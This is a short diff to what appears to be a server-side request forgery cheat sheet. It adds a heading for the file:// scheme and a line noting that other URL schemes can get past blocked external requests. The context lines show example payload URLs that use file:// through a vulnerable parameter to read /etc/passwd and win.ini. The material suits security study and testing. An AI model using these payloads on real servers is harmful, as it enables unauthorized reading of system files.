@@ -95,11 +95,13 @@
     gopher://
     
     
- file:// -
+## file:// -
  
    File is used to fetch file from the file system
    
     http://example.com/ssrf.php?url=file:///etc/passwd
     http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
+    
+ If the server block http request to external sites or whitelist you could simply use below URL schemas to make a request
     
     
